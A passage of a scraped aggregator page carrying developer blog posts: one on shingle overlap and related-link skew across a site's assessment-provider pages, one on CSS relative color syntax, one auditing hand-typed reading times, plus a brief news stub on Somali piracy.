+    <span>words</span> <span>=</span> <span>[</span><span>w</span><span>.</span><span>lower</span><span>()</span> <span>for</span> <span>w</span> <span>in</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>r</span><span>"</span><span>[A-Za-z</span><span>'</span><span>]+</span><span>"</span><span>,</span> <span>text</span><span>)]</span>
+    <span>return</span> <span>set</span><span>(</span><span>tuple</span><span>(</span><span>words</span><span>[</span><span>i</span><span>:</span><span>i</span><span>+</span><span>n</span><span>])</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>len</span><span>(</span><span>words</span><span>)</span> <span>-</span> <span>n</span> <span>+</span> <span>1</span><span>))</span>
+
+
+
+
+
+
+<p>Across five pages in the cluster (<a href="https://cogniprep.app/cheating/shl">shl</a>, <a href="https://cogniprep.app/cheating/aon">aon</a>, <a href="https://cogniprep.app/cheating/hogan">hogan</a>, <a href="https://cogniprep.app/cheating/usps">usps</a> and <a href="https://cogniprep.app/cheating/train-driver">train-driver</a>), each 1,361 to 1,806 words:<br>
+</p>
+
+
+
+
+aon vs hogan            15.0% of the first page's shingles
+aon vs shl              20.4%
+aon vs train-driver     21.3%
+hogan vs usps           19.3%
+train-driver vs usps    12.0%
+
+
+
+
+
+
+<p>12 to 21 percent, and the floor is the interesting number. No pair in the cluster shares fewer than 210 shingles. To find out what that floor is made of, I ran the same comparison between a cheating page and <a href="https://cogniprep.app/tests">an unrelated page on the site</a>: 162 shared shingles, with no subject matter in common at all. So 162 of the floor is the header, navigation and footer, and the remaining 48 or so is the cluster's own shared furniture, the verdict banner and the call to action. Subtract both and the bodies overlap by a few percent.</p>
+
+<p>Eight words is the right window size for this. Four-word windows match on ordinary English and tell you nothing; sixteen only catch verbatim paragraphs. Eight catches a reused sentence shape, which is the thing a template produces and a writer does not.</p>
+
+<h2>
+  
+  
+  The part we got wrong
+</h2>
+
+<p>Every page ends with three related pages, chosen by a function with a limit = 3 default:<br>
+</p>
+
+
+
+
+<span>const</span> <span>family</span> <span>=</span> <span>Object</span><span>.</span><span>values</span><span>(</span><span>FAMILIES</span><span>).</span><span>find</span><span>((</span><span>m</span><span>)</span> <span>=&gt;</span> <span>m</span><span>.</span><span>includes</span><span>(</span><span>provider</span><span>))</span> <span>??</span> <span>[];</span>
+
+<span>const</span> <span>ordered</span> <span>=</span> <span>[</span>
+  <span>...</span><span>family</span><span>.</span><span>filter</span><span>((</span><span>p</span><span>)</span> <span>=&gt;</span> <span>p</span> <span>!==</span> <span>provider</span><span>),</span>
+  <span>...</span><span>CHEATING_GUIDES</span><span>.</span><span>map</span><span>((</span><span>g</span><span>)</span> <span>=&gt;</span> <span>g</span><span>.</span><span>provider</span><span>)</span>
+    <span>.</span><span>filter</span><span>((</span><span>p</span><span>)</span> <span>=&gt;</span> <span>p</span> <span>!==</span> <span>provider</span> <span>&amp;&amp;</span> <span>!</span><span>family</span><span>.</span><span>includes</span><span>(</span><span>p</span><span>)),</span>
+<span>];</span>
+
+<span>return</span> <span>ordered</span><span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>limit</span><span>).</span><span>map</span><span>((</span><span>p</span><span>)</span> <span>=&gt;</span> <span>BY_PROVIDER</span><span>[</span><span>p</span><span>]).</span><span>filter</span><span>(</span><span>Boolean</span><span>);</span>
+
+
+
+
+
+
+<p>Family first, then everything else in canonical order. The families themselves are carefully argued, with comments explaining why a given provider sits with the reasoning group rather than the speeded one. The sizes are the problem:<br>
+</p>
+
+
+
+
+reasoning      30 members
+dutch           9
+speeded         8
+gamified        4
+no family       5
+
+
+
+
+
+
+<p>A 30-member family and three slots means the three slots are always the same three members. Taken across all 56 pages:<br>
+</p>
+
+
+
+
+distinct related-link trios            17
+pages showing shl / faa-atsa / sova    27
+inbound related links to shl           29
+providers never offered as related     37
+
+
+
+
+
+
+<p>Two thirds of the family sees the same trio, and 37 of the 56 pages are never recommended by any page in their own cluster. You can watch it happen:<br>
+</p>
+
+
+
+
+<span>for </span>p <span>in </span>train-driver usa-hire usps hogan<span>;</span> <span>do
+  </span><span>echo</span> <span>"--- </span><span>$p</span><span>"</span>
+  curl <span>-s</span> <span>"https://cogniprep.app/cheating/</span><span>$p</span><span>"</span> | <span>grep</span> <span>-o</span> <span>'href="/cheating/[a-z0-9-]*"'</span>
+<span>done</span>
+
+
+
+
+
+
+<p>train-driver offers shl, faa-atsa and sova. So does almost every other page in the reasoning family. usps and hogan, which belong to no family, get the first three entries in registry order instead, which is an even more arbitrary answer dressed up as a recommendation.</p>
+
+<p>Nothing is broken. Every link is valid, every target is a real page, the typecheck is clean and the pages render. The function does exactly what it says. It just turns a 56-node graph into a star with three centres, and no test asserts anything about the shape of the output, so it went unnoticed for as long as the families stayed small.</p>
+
+<p>The fix is to deal from the family rather than slicing it: order the candidates by something page-specific, rotate so each page appears in a bounded number of other pages' slots, and then assert the distribution in a test rather than the validity of the links. Checking that the links resolve was never the hard part.</p>
+
+<h2>
+  
+  
+  Two smaller things the count turned up
+</h2>
+
+<p>The word fourteen appears three times in that file's comments, describing the cluster's size. There are 56 pages. The comments were written when 14 providers were live and they were accurate then, which is the problem with counts in prose: they are facts with no test attached. The comments that survived are the ones stating a rule rather than a number.</p>
+
+<p>And the derived list is built like this:<br>
+</p>
+
+
+
+
+<span>export</span> <span>const</span> <span>CHEATING_GUIDES</span> <span>=</span> <span>ALL_PROVIDERS</span><span>.</span><span>map</span><span>((</span><span>provider</span><span>)</span> <span>=&gt;</span>
+  <span>GUIDES</span><span>.</span><span>find</span><span>((</span><span>guide</span><span>)</span> <span>=&gt;</span> <span>guide</span><span>.</span><span>provider</span> <span>===</span> <span>provider</span><span>)</span>
+<span>).</span><span>filter</span><span>((</span><span>guide</span><span>):</span> <span>guide</span> <span>is</span> <span>CheatingGuide</span> <span>=&gt;</span> <span>Boolean</span><span>(</span><span>guide</span><span>));</span>
+
+
+
+
+
+
+<p>Adding a provider without writing its guide does not fail a build. It produces one fewer page, silently, and the .filter makes the types work out perfectly. What saves us is a per-provider test asserting that the provider appears everywhere it should, which is the only reason that line is safe to keep.</p>
+
+<h2>
+  
+  
+  If you have a cluster like this
+</h2>
+
+<ol>
+<li>Key it to whatever genuinely varies, and if nothing does, write one page.</li>
+<li>Generate the metadata from one place so a canonical cannot drift, and hand-write every sentence a reader sees.</li>
+<li>Measure the published pages, not the source: eight-word shingles against the live HTML, and expect your chrome to be the floor.</li>
+<li>Test the shape of your internal links, not just their validity. Valid links pointing at three pages is the failure mode that looks like success.</li>
+</ol>
+
+<p>The hub is at <a href="https://cogniprep.app/cheating">cogniprep.app/cheating</a>, and the shingle script above runs against it unchanged.</p></div>
+</article>
+<div style="text-align:center;margin:20px 0;">
+    <script type="text/javascript">
+        atOptions = {
+            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+        };
+    </script>
+    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
+</div>
+
+<article class="article-card" id="artikel-7259">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Stop Hardcoding Color Variants. Relative Color Syntax Does It.", "image": [], "datePublished": "2026-11-01T12:57:09+00:00", "dateModified": "2026-11-01T12:57:09+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7259"}</script>
+    <h2>Stop Hardcoding Color Variants. Relative Color Syntax Does It.</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://dev.to/parsajiravand/stop-hardcoding-color-variants-relative-color-syntax-does-it-1f8k" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p>The PR comment was two words: "wrong blue." Not a bug report, not a reproduction — a designer scrolling through a staging build, stopping on the "Upgrade" button's hover state, and flagging it because something about it felt off against the rest of the rebrand that had shipped two weeks earlier.</p>
+
+<p>They were right, and it took longer than it should have to find out why. The button's resting color matched the new brand blue exactly — that token had been updated the day the rebrand landed. Its hover color was still the <em>old</em> brand blue, darkened. Nobody had touched it, because nobody remembered it existed.</p>
+
+<h2>
+  
+  
+  Five variables, one of which actually gets updated
+</h2>
+
+<p>Open almost any design system's color file and you'll find the same shape: one brand color, and a handful of hand-picked variants sitting next to it that all <em>look</em> derived but are actually just... more hex codes.<br>
+</p>
+
+
+
+
+<span>:root</span> <span>{</span>
+  <span>--brand</span><span>:</span> <span>#3b6fd6</span><span>;</span>
+  <span>--brand-hover</span><span>:</span> <span>#2f58ab</span><span>;</span>      <span>/* "a bit darker" — picked by eye, once */</span>
+  <span>--brand-active</span><span>:</span> <span>#244289</span><span>;</span>     <span>/* "darker still" — same deal */</span>
+  <span>--brand-border</span><span>:</span> <span>#6e92e1</span><span>;</span>     <span>/* "a bit lighter" */</span>
+  <span>--brand-tint</span><span>:</span> <span>rgba</span><span>(</span><span>59</span><span>,</span> <span>111</span><span>,</span> <span>214</span><span>,</span> <span>0.08</span><span>);</span> <span>/* "faint background wash" */</span>
+<span>}</span>
+
+
+
+
+
+
+<p>Every one of those four extra values is somebody's good-faith attempt, at some point in the past, to eyeball a lighter or darker or more-transparent version of --brand. They're not wrong on day one. The problem shows up the day --brand changes and the other four don't — because CSS has no idea they were ever related. To the engine, --brand-hover isn't "darker --brand." It's just a string that starts with #2f58ab, full stop.</p>
+
+<p>The "obvious" fix is discipline: a comment reminding whoever edits --brand to also update the other four, or a design-tokens build step that regenerates them from a single source before CSS ever sees them. Both work, right up until the person making a one-line brand tweak six months from now doesn't know the build step exists, or skims past the comment. Discipline that depends on nobody being in a hurry isn't a fix — it's a bet, and the rebrand PR is the bet losing.</p>
+
+<h2>
+  
+  
+  The variables were never the problem — storing the <em>relationship</em> was
+</h2>
+
+<p>Here's the reframe that matters: --brand-hover was never really an independent color. It was always a <em>function of</em> --brand — "darker, same hue." --brand-tint was always "the same color, 8% opaque." The relationship was real and well understood by whoever first picked those hex codes. What got lost was that the relationship lived in a person's head for thirty seconds and then evaporated, leaving only its one-time output behind, frozen in a stylesheet forever.</p>
+
+<p>What you actually want is for CSS to store the <em>relationship</em>, not just a snapshot of what it once produced — and that's a genuinely new category of thing for CSS to express. For most of CSS's life, a color value was a dead end: #3b6fd6 tells the renderer what to paint, but nothing about where it came from or how to get a cousin of it. color-mix() loosened that slightly — you can blend two colors — but blending two colors isn't the shape of this problem. You don't have two brand colors to mix; you have <strong>one</strong> color, and you want its lightness turned down a notch while everything else about it stays put.</p>
+
+<p><strong>Before you keep reading: what would you even call the CSS feature that lets you say "same color, just darker"?</strong> It's a fair question, because until relatively recently there wasn't a clean answer.</p>
+
+<h2>
+  
+  
+  Relative color syntax: read a color's own channels back out
+</h2>
+
+<p>Relative color syntax lets a color function take another color as input and expose <em>that color's own channels</em> as variables you can do math on, right there in the function call:<br>
+</p>
+
+
+
+
+<span>:root</span> <span>{</span>
+  <span>--brand</span><span>:</span> <span>#3b6fd6</span><span>;</span>
+
+  <span>/* "same hue and chroma as --brand, just darker" */</span>
+  <span>--brand-hover</span><span>:</span>  <span>oklch</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>calc</span><span>(</span><span>l</span> <span>-</span> <span>0.12</span><span>)</span> <span>c</span> <span>h</span><span>);</span>
+  <span>--brand-active</span><span>:</span> <span>oklch</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>calc</span><span>(</span><span>l</span> <span>-</span> <span>0.20</span><span>)</span> <span>c</span> <span>h</span><span>);</span>
+
+  <span>/* "same color, lighter, for a border" */</span>
+  <span>--brand-border</span><span>:</span> <span>oklch</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>calc</span><span>(</span><span>l</span> <span>+</span> <span>0.15</span><span>)</span> <span>c</span> <span>h</span><span>);</span>
+
+  <span>/* "same color, 8% opaque" */</span>
+  <span>--brand-tint</span><span>:</span> <span>oklch</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>l</span> <span>c</span> <span>h</span> <span>/</span> <span>8%</span><span>);</span>
+<span>}</span>
+
+
+
+
+
+
+<p>Read the oklch(from var(--brand) ...) part literally: "take --brand, convert it to OKLCH, and give me three variables back — l for lightness, c for chroma, h for hue." Whatever you write after that is just CSS math on those three numbers (plus an optional alpha after the slash). calc(l - 0.12) means "this color's own lightness, minus 0.12" — not a hardcoded lightness value, a relationship to whatever --brand happens to be <em>right now</em>.</p>
+
+<p>Change --brand to a rebrand's new blue, or swap it entirely for a dark-mode theme, and every line below it recomputes. There's no second hex code to forget, because there is no second hex code — --brand-hover isn't stored anywhere; it's derived, every time the browser needs it, from the one variable a human actually edits.</p>
+
+<p>This isn't OKLCH-only, either. rgb(), hsl(), and color() all support the same from syntax, exposing whichever channels that color space naturally has:<br>
+</p>
+
+
+
+
+<span>/* rgb()'s own channels: r, g, b (0–255), alpha */</span>
+<span>.badge</span> <span>{</span> <span>background</span><span>:</span> <span>rgb</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>r</span> <span>g</span> <span>b</span> <span>/</span> <span>15%</span><span>);</span> <span>}</span>
+
+<span>/* hsl()'s own channels: h, s, l, alpha — s and l come back as plain
+   numbers (0-100), not percentages, so the math below uses 10, not 10% */</span>
+<span>.link</span><span>:hover</span> <span>{</span> <span>color</span><span>:</span> <span>hsl</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>h</span> <span>s</span> <span>calc</span><span>(</span><span>l</span> <span>-</span> <span>10</span><span>));</span> <span>}</span>
+
+
+
+
+
+
+<p>OKLCH is usually the better pick for lightness math specifically, because it's designed so that "lightness" tracks <em>perceived</em> brightness consistently across hues — nudging l down by the same amount darkens a yellow and a blue by roughly the same perceived amount. Nudge hsl()'s l channel the same way and the result can feel inconsistent hue to hue, because HSL's lightness was never built to model human perception in the first place.</p>
+
+<h2>
+  
+  
+  🎮 Try it yourself
+</h2>
+
+<p><strong><a href="https://bestpractic.org/blog/css-relative-color-syntax/playground">▶️ Open the interactive playground →</a></strong></p>
+
+<p><em>Runs right in your browser — poke at it and watch the concept react live.</em></p>
+
+<h2>
+  
+  
+  The one sharp edge: clamp your math
+</h2>
+
+<p>calc(l - 0.12) is honest math, which means it'll happily produce a number outside the range that makes sense. Pick a brand color that's already quite dark, subtract 0.20 from its lightness, and l can go negative — which isn't a color error so much as a "this doesn't mean anything" result, rendered as whatever the browser decides black looks like.</p>
+
+<p>The fix is the same clamp() you'd reach for anywhere else in CSS, wrapped around the channel math:<br>
+</p>
+
+
+
+
+<span>--brand-hover</span><span>:</span> <span>oklch</span><span>(</span><span>from</span> <span>var</span><span>(</span><span>--brand</span><span>)</span> <span>clamp</span><span>(</span><span>0</span><span>,</span> <span>calc</span><span>(</span><span>l</span> <span>-</span> <span>0</span><span>.</span><span>12</span><span>),</span> <span>1</span><span>)</span> <span>c</span> <span>h</span><span>);</span>
+
+
+
+
+
+
+<p>That one change makes the derivation safe for <em>any</em> input color, including ones your design system doesn't control yet — a user-customizable accent color, say, or a brand color read from a CMS. Skip the clamp and the formula only works for colors in roughly the lightness range you tested it against, which defeats a good chunk of the point: a derivation that only works for some inputs is just a more elaborate hardcoded value.</p>
+
+<h2>
+  
+  
+  Is this safe to ship, or is it another flag-gated preview?
+</h2>
+
+<p>Safe to ship — but the rollout order isn't what you'd guess. Safari 16.4 (March 2023) was the earliest browser with <em>something</em>, but it was a partial pass at an older draft of the spec with real parsing bugs; that implementation was later replaced, not extended. Chrome and Firefox did the work of actually matching the final spec through 2024 (Firefox in Firefox 128, July 2024), and Safari didn't catch up — bug fixes included — until Safari 18 in September 2024. So for the exact forms used above, Safari was last to ship the behavior this post describes, not first. Either way, that was over two years ago: by now every major evergreen browser has unprefixed, unflagged, spec-correct support, and there's no realistic "but what about X" objection left to raise for a typical modern browser matrix. If your project still has to support browsers from before that window, the fallback is simple and honest: keep writing literal hex variants for those browsers, and layer the relative syntax on top for everyone else — it degrades to "the hardcoded value you already had," not to a broken page.</p>
+
+<h2>
+  
+  
+  🧠 Test yourself
+</h2>
+
+<p>Think it clicked? <strong><a href="https://bestpractic.org/blog/css-relative-color-syntax/quiz">Take the 7-question quiz →</a></strong></p>
+
+<p><em>Instant feedback, a hint on every question, and an explanation for each answer — right or wrong.</em></p>
+
+<p>The bug wasn't really "someone forgot to update a hex code." It was that the stylesheet never had anywhere to <em>put</em> the fact that --brand-hover meant "darker --brand" — so that knowledge lived in a person's memory instead, with exactly the shelf life you'd expect. Relative color syntax isn't a shorter way to write the same five hex codes. It's a way to stop writing four of them at all.</p>
+
+<p>Where does your own color system still keep that kind of relationship in a comment instead of in the CSS itself?</p>
+
+<h2>
+  
+  
+  📚 Read next
+</h2>
+
+<ul>
+<li><a href="https://dev.to/parsajiravand/the-css-property-that-fixes-dark-modes-ugly-white-boxes-58hc">The CSS Property That Fixes Dark Mode's Ugly White Boxes</a></li>
+<li><a href="https://dev.to/parsajiravand/one-css-property-replaces-your-checkbox-hack-4jhk">One CSS Property Replaces Your Checkbox Hack</a></li>
+<li><a href="https://dev.to/parsajiravand/you-reach-for-sass-to-mix-colors-color-mix-does-it-natively-17p1">You reach for Sass to mix colors. color-mix() does it natively.</a></li>
+</ul>
+
+
+
+
+<p>🚀 <strong>Want more like this?</strong> Every guide, playground, and quiz lives on <strong><a href="https://bestpractic.org/">bestpractic.org</a></strong> — open it and <strong><a href="https://bestpractic.org/">sign up free</a></strong> so the next one finds you.</p>
+
+<p><em>Thanks for reading! Let's stay connected:</em></p>
+
+<ul>
+<li>⭐ <strong>GitHub</strong> — follow me and star the projects: <a href="https://github.com/parsajiravand">github.com/parsajiravand</a>
+</li>
+<li>💬 <strong>Discord</strong> — join the frontend best-practices community: <a href="https://discord.gg/d9KRhuAwQ">discord.gg/d9KRhuAwQ</a>
+</li>
+<li>📸 <strong>Instagram</strong> — frontend best practices, daily: <a href="https://www.instagram.com/bestpractice___/">@bestpractice___</a>
+</li>
+</ul></div>
+</article>
+<article class="article-card" id="artikel-7260">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Two of our pages are 1,065 and 1,083 words long, and the reading times under their titles say 6 minutes and 8 minutes", "image": [], "datePublished": "2026-11-01T12:56:36+00:00", "dateModified": "2026-11-01T12:56:36+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7260"}</script>
+    <h2>Two of our pages are 1,065 and 1,083 words long, and the reading times under their titles say 6 minutes and 8 minutes</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://dev.to/daniel_pertu/two-of-our-pages-are-1065-and-1083-words-long-and-the-reading-times-under-their-titles-say-6-34p9" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><p><a href="https://notifio.app">Notifio</a> is a desktop app that watches rental search pages and alerts you when a new listing appears. Around it is a Next.js site, and eight of that site's 38 URLs are long-form pages: five <a href="https://notifio.app/guides">guides</a> and three pages for a kind of person rather than a task.</p>
+
+<p>They are all one type:<br>
+</p>
+
+
+
+
+<span>export</span> <span>type</span> <span>Article</span> <span>=</span> <span>{</span>
+  <span>slug</span><span>:</span> <span>string</span><span>;</span>
+  <span>/** Which route this belongs to. */</span>
+  <span>kind</span><span>:</span> <span>"</span><span>audience</span><span>"</span> <span>|</span> <span>"</span><span>guide</span><span>"</span><span>;</span>
+  <span>eyebrow</span><span>:</span> <span>string</span><span>;</span>
+  <span>title</span><span>:</span> <span>string</span><span>;</span>
+  <span>description</span><span>:</span> <span>string</span><span>;</span>
+  <span>h1</span><span>:</span> <span>string</span><span>;</span>
+  <span>standfirst</span><span>:</span> <span>string</span><span>;</span>
+
+  <span>/** Rough minutes, shown under the title. Keep it honest. */</span>
+  <span>readingMinutes</span><span>:</span> <span>number</span><span>;</span>
+
+  <span>sections</span><span>:</span> <span>ArticleSection</span><span>[];</span>
+  <span>faqs</span><span>:</span> <span>{</span> <span>q</span><span>:</span> <span>string</span><span>;</span> <span>a</span><span>:</span> <span>string</span> <span>}[];</span>
+  <span>sources</span><span>:</span> <span>ArticleSource</span><span>[];</span>
+  <span>relatedSites</span><span>:</span> <span>string</span><span>[];</span>
+  <span>relatedArticles</span><span>:</span> <span>string</span><span>[];</span>
+<span>};</span>
+
+
+
+
+
+
+<p>readingMinutes is a number a person types. There is no word count behind it, no division, nothing derived. The comment says "Keep it honest", which is the sort of instruction that deserves to be checked, so I checked it.</p>
+
+<h2>
+  
+  
+  What the pages actually contain
+</h2>
+
+<p>Counted from the rendered &lt;main&gt; of each live page, which includes the body, the headings, the FAQ block and the related links, because that is what a reader scrolls through:</p>
+
+
+
+
+
+
+Page
+Claimed
+Words
+Implied words per minute
+
+
+
+
+<a href="https://notifio.app/guides/how-fast-do-rental-listings-go">/guides/how-fast-do-rental-listings-go</a>
+6
+1,065
+178
+
+
+<a href="https://notifio.app/guides/how-to-be-first-to-a-rental-listing">/guides/how-to-be-first-to-a-rental-listing</a>
+7
+1,085
+155
+
+
+<a href="https://notifio.app/guides/first-message-to-a-landlord">/guides/first-message-to-a-landlord</a>
+6
+966
+161
+
+
+<a href="https://notifio.app/guides/rental-documents-checklist">/guides/rental-documents-checklist</a>
+5
+845
+169
+
+
+<a href="https://notifio.app/guides/rental-scams-netherlands">/guides/rental-scams-netherlands</a>
+6
+1,172
+195
+
+
+<a href="https://notifio.app/for/students">/for/students</a>
+7
+1,228
+175
+
+
+<a href="https://notifio.app/for/expats">/for/expats</a>
+8
+1,219
+152
+
+
+<a href="https://notifio.app/for/amsterdam">/for/amsterdam</a>
+8
+1,083
+135
+
+
+
+
+<p>The usual convention for a read-time badge is 200 to 250 words a minute. Against 200, every single one of these eight claims is longer than the page. That on its own I can live with: generous is the right direction to be wrong in, because a reader who finishes early is pleased and a reader who runs over feels misled.</p>
+
+<p>The part I cannot defend is the spread. The first row and the last row are 18 words apart, 1,065 against 1,083, and their badges differ by two minutes. There is no reading speed at which both of those numbers are right. Whatever the typed figure measures, it is not length, and it is not consistent between two pages written weeks apart by the same person.</p>
+
+<p>It is also not very useful information. The honest version of the field, for a page of this size, has two possible values: "about five minutes" or "about eight minutes", and the difference between the two is one scroll.</p>
+
+<h2>
+  
+  
+  The two ways to get this wrong
+</h2>
+
+<p>A sibling codebase of mine has <a href="https://dev.to/daniel_pertu/every-read-time-on-our-blog-is-a-word-count-divided-by-200-and-the-word-count-is-a-number-somebody-52l8">read times computed as a word count divided by 200</a>, where the division is real and the word count is a number somebody typed. This one skips the arithmetic and types the answer.</p>
+
+<p>They are the same bug wearing different clothes: a derived number stored as an input. Both look fine forever, because nothing can fail. A page gets two new sections, nobody updates the badge, and the badge was never checked against anything in the first place.</p>
+
+<p>The fix is three lines, and it is the same three lines in both codebases:<br>
+</p>
+
+
+
+
+<span>export</span> <span>function</span> <span>readingMinutes</span><span>(</span><span>article</span><span>:</span> <span>Article</span><span>):</span> <span>number</span> <span>{</span>
+  <span>const</span> <span>words</span> <span>=</span> <span>article</span><span>.</span><span>sections</span><span>.</span><span>flatMap</span><span>((</span><span>s</span><span>)</span> <span>=&gt;</span> <span>[</span>
+    <span>s</span><span>.</span><span>heading</span><span>,</span>
+    <span>...</span><span>s</span><span>.</span><span>body</span><span>,</span>
+    <span>...(</span><span>s</span><span>.</span><span>points</span> <span>??</span> <span>[]).</span><span>flatMap</span><span>((</span><span>p</span><span>)</span> <span>=&gt;</span> <span>[</span><span>p</span><span>.</span><span>title</span><span>,</span> <span>p</span><span>.</span><span>body</span><span>]),</span>
+  <span>]);</span>
+  <span>return</span> <span>Math</span><span>.</span><span>max</span><span>(</span><span>1</span><span>,</span> <span>Math</span><span>.</span><span>round</span><span>(</span><span>words</span><span>.</span><span>join</span><span>(</span><span>"</span><span> </span><span>"</span><span>).</span><span>split</span><span>(</span><span>/</span><span>\s</span><span>+/</span><span>).</span><span>length</span> <span>/</span> <span>200</span><span>));</span>
+<span>}</span>
+
+
+
+
+
+
+<p>The content is already structured data in a TypeScript file, so the word count is available at build time for free. Deleting a field from a type is a nicer change than adding a test that asserts a human typed a defensible number.</p>
+
+<h2>
+  
+  
+  While I was in there
+</h2>
+
+<p>Three other things the same eight objects told me.</p>
+
+<p><strong>Thirty-two FAQs, exactly four per page.</strong> Not approximately four. Four, eight times. Nobody decided that a page must have four questions, and yet nobody has ever shipped one with three or five, which is the kind of pattern that forms when you copy the previous entry and fill it in. The questions are good and the uniformity is a tell: a page with only two real questions should ship two.</p>
+
+<p><strong>Five citations across eight pages.</strong> sources is part of the trust model, because the rule these pages are written against, in the type's own comment, is that "the advice has to be worth reading by somebody who never buys anything". Two pages carry two sources, one carries one, and five carry none. The layout renders the block conditionally:<br>
+</p>
+
+
+
+
+<span>{</span><span>article</span><span>.</span><span>sources</span><span>.</span><span>length</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>(</span>
+  <span>// ...the Sources heading and the list</span>
+<span>)}</span>
+
+
+
+
+
+
+<p>So five of the eight do not show an empty Sources heading, they show no heading, and nothing in the build complains. The pages with nothing to cite are the softer, advice-shaped ones, which is exactly where a citation does the most work. A test that fails a published article with zero sources is the cheap version of a standard, and it would currently fail five pages, which is the point.</p>
+
+<p><strong>One URL space, no root.</strong> Guides live at /guides/&lt;slug&gt; and audience pages at /for/&lt;slug&gt;, from one type, split by one field:<br>
+</p>
+
+
+
+
+<span>export</span> <span>function</span> <span>articleHref</span><span>(</span><span>article</span><span>:</span> <span>Article</span><span>):</span> <span>string</span> <span>{</span>
+  <span>return</span> <span>article</span><span>.</span><span>kind</span> <span>===</span> <span>"</span><span>audience</span><span>"</span> <span>?</span> <span>`/for/</span><span>${</span><span>article</span><span>.</span><span>slug</span><span>}</span><span>`</span> <span>:</span> <span>`/guides/</span><span>${</span><span>article</span><span>.</span><span>slug</span><span>}</span><span>`</span><span>;</span>
+<span>}</span>
+
+
+
+
+
+
+<p>That split is deliberate and I would do it again: /guides/ is for somebody describing a task, /for/ is for somebody describing themselves, and the two read differently even when they say similar things. The consequence is that /for by itself is a 404. The hub at <a href="https://notifio.app/guides">/guides</a> lists both kinds and its ItemList structured data carries all eight, so nothing is unreachable, but the parent of three live URLs answering 404 is the kind of thing an SEO audit flags and a human never notices.</p>
+
+<h2>
+  
+  
+  The link graph, which I was not expecting to be the best part
+</h2>
+
+<p>Each article links three others and three or four of the per-site <a href="https://notifio.app/alerts">alert pages</a>. Counting inbound links across the eight:</p>
+
+<ul>
+<li>
+<a href="https://notifio.app/guides/first-message-to-a-landlord">first-message-to-a-landlord</a>: 5</li>
+<li>
+<a href="https://notifio.app/guides/rental-scams-netherlands">rental-scams-netherlands</a>: 4</li>
+<li>rental-documents-checklist, expats, amsterdam: 3 each</li>
+<li>how-fast-do-rental-listings-go, how-to-be-first-to-a-rental-listing, students: 2 each</li>
+</ul>
+
+<p>Twenty-four links, hand-written, no orphans, and the most-linked page is the one about what to write to a landlord, which is also the page a person actually needs at the moment they are panicking. The structure came out right because each article's relatedArticles was filled in by somebody thinking about that reader rather than about the graph.</p>
+
+<p>The alert pages did less well. Twelve of the fifteen get at least one link from an article. Three get none: <a href="https://notifio.app/alerts/huurwoningen">Huurwoningen</a>, <a href="https://notifio.app/alerts/immobilienscout24">ImmobilienScout24</a> and <a href="https://notifio.app/alerts/zoopla">Zoopla</a>. Those three are reachable from the hub and the footer, so this is not the <a href="https://dev.to/daniel_pertu/fifteen-pages-45-sibling-links-and-the-one-page-no-sibling-links-to-290d">page with no sibling links</a> problem I wrote about before, it is a weaker version of it: the pages with the fewest editorial links in are the ones whose countries the guides happen not to be about. Two of the three are the UK and Germany, and the guides lean Dutch. The fix is a guide, not a link.</p>
+
+<p>If you want to read the pages rather than the measurements, they are at <a href="https://notifio.app/guides">notifio.app/guides</a>, the per-site setup pages are at <a href="https://notifio.app/alerts">notifio.app/alerts</a>, and the app the whole thing is in front of is on the <a href="https://notifio.app/download">download page</a> with its price on the <a href="https://notifio.app/pricing">pricing page</a>. The reading times are under the titles. They are too high by about a minute each, and the next change to that file takes the field out.</p></div>
+</article>
+<article class="article-card" id="artikel-7924">
+    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Somali pirates seize Iranian fishing vessel, raising fears of attacks on cargo ships", "image": ["https://static.independent.co.uk/2026/11/01/13/Somalia_Piracy_27873.jpg?width=1200&auto=webp&crop=3%3A2"], "datePublished": "2026-11-01T12:56:33+00:00", "dateModified": "2026-11-01T12:56:33+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-7924"}</script>
+    <h2>Somali pirates seize Iranian fishing vessel, raising fears of attacks on cargo ships</h2>
+    <div class="article-meta">
+        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
+        <a href="https://www.independent.co.uk/news/mogadishu-indian-ocean-yemen-strait-of-hormuz-puntland-b3077087.html" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
+    </div>
+    <div class="article-body"><img src="https://static.independent.co.uk/2026/11/01/13/Somalia_Piracy_27873.jpg?width=1200&amp;auto=webp&amp;crop=3%3A2" alt="Somali pirates seize Iranian fishing vessel, raising fears of attacks on cargo ships" loading="lazy">Somali pirates have hijacked an Iranian fishing boat called the Azini with 23 people on board</div>
+</article>
+<article class="article-card" id="artikel-7925">
